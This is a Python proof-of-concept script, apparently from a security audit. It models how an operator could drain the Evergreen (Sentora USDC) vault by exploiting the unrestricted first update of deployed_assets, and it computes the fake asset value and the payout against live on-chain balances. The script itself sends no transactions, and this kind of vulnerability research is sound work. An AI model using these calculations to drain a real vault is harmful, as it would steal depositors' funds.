#!/usr/bin/env python3
"""
Exact-integer model of the operator-only NAV-inflation drain on the Evergreen
(Sentora USDC) vault, using the deployed contract's own formulas:

  shares = floor(assets * (totalSupply + 10^offset) / (totalAssets + 1))
  assets = floor(shares * (totalAssets + 1) / (totalSupply + 10^offset))

`update_deployed_assets` is operator-only. Its AUM rate limit is skipped when the
previous `deployed_assets` is 0 (source comment: "old_deployed == 0 ...
Changes at the zero boundary are unrestricted"). The live value is 0, so the
operator's first call can set any NAV.

This script computes, for a chosen operator deposit D, the fake `deployed_assets`
N that makes the operator's share balance exactly equal to `max_redeem`, so the
redeem pays out the entire local USDC balance. It does not sign or send anything.
"""
import json

A0 = 337_527_309_523_545      # vault USDC balance, 7 decimals (raw)
S0 = 328_588_906_164_540_243_848  # share total supply, 13 decimals (raw)
OFFSET = 10**6                # 10^decimals_offset (offset = 6)
I128_MAX = 2**127 - 1


def shares_for(assets_raw, total_assets_raw, supply_raw):
    return assets_raw * (supply_raw + OFFSET) // (total_assets_raw + 1)


def assets_for(shares_raw, total_assets_raw, supply_raw):
    return shares_raw * (total_assets_raw + 1) // (supply_raw + OFFSET)


def scenario(deposit_usdc):
    d_raw = int(deposit_usdc * 1e7)
    s = shares_for(d_raw, A0, S0)          # shares minted to operator at fair price
    A1 = A0 + d_raw                        # real local balance after deposit
    S1 = S0 + s
    # N such that convert_to_shares(A1, A1+N, Floor) == s  (max_redeem binds exactly)
    N = A1 * (S1 + OFFSET) // s - A1 - 1
    A2 = A1 + N
    cap = shares_for(A1, A2, S1)
    payout = assets_for(min(s, cap), A2, S1)
    return {
        "operator_deposit_usdc": deposit_usdc,
        "shares_minted_raw": s,
        "fake_deployed_assets_raw": N,
        "fake_deployed_assets_usd": round(N / 1e7, 2),
        "fits_i128": N <= I128_MAX,
        "max_redeem_cap_raw": cap,
        "payout_raw": payout,
        "payout_usd": round(payout / 1e7, 2),
        "profit_usd": round((payout - d_raw) / 1e7, 2),
    }


if __name__ == "__main__":
    out = {
        "live_total_assets_raw": A0,
        "live_total_supply_raw": S0,
        "live_total_assets_usd": round(A0 / 1e7, 2),
        "i128_max": I128_MAX,
        "scenarios": [scenario(d) for d in (1, 100, 1_000, 10_000, 100_000)],
        "note": "operator-only (P): requires the operator key, not an unprivileged caller",
    }
    print(json.dumps(out, indent=1))
    json.dump(out, open("ci-out/operator-drain-model.json", "w"), indent=1)
